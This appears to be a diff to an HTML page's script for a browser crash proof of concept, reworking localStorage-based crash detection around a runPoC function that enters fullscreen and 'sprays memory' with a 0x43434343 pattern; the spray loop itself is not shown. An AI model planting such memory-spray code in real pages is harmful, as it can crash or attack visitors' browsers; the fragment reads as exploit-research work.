@@ -153,40 +153,34 @@ body {
 </div>
 <script>
 window.onload = () => {
-  const wasCrashing = localStorage.getItem("crashFlag") === "1";
-  const safeClosed = localStorage.getItem("safeClose") === "1";
-  const lastCrashTime = parseInt(localStorage.getItem("crashTime") || "0");
+  const flag = localStorage.getItem("crashFlag");
+  const time = parseInt(localStorage.getItem("crashTime") || "0");
   const now = Date.now();
-  const elapsed = Math.floor((now - lastCrashTime) / 1000);
+  const elapsed = Math.floor((now - time) / 1000);
 
-  if (wasCrashing && !safeClosed && elapsed > 5) {
+  // Solo si hubo intento previo y han pasado 6+ segundos
+  if (flag === "1" && elapsed >= 6 && elapsed < 300) {
     let count = parseInt(localStorage.getItem("crashCount") || "0");
     count++;
     localStorage.setItem("crashCount", count.toString());
 
     alert(`⚠️ Last run may have triggered instability or crash.\n⏱ Elapsed: ${elapsed}s\n💥 Total crashes detected: ${count}`);
+    
+    // Limpieza
+    localStorage.removeItem("crashFlag");
+    localStorage.removeItem("crashTime");
   }
-
-  // Limpieza de flags
-  localStorage.removeItem("crashFlag");
-  localStorage.removeItem("crashTime");
-  localStorage.removeItem("safeClose");
 };
-
-// Marcamos cierre limpio
-window.addEventListener("beforeunload", () => {
-  localStorage.setItem("safeClose", "1");
-});
 
 function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  // Preparamos crash flag
+  // Guardamos marca de posible crash
   localStorage.setItem("crashFlag", "1");
   localStorage.setItem("crashTime", Date.now().toString());
-  localStorage.removeItem("safeClose"); // Se desmarca el cierre limpio
 
+  // Esperamos medio segundo para asegurarnos que se guarda
   setTimeout(() => {
     document.body.requestFullscreen().then(() => {
       const PATTERN = 0x43434343;
@@ -217,6 +211,7 @@ function runPoC() {
   }, 500);
 }
 </script>
+
 
 
 
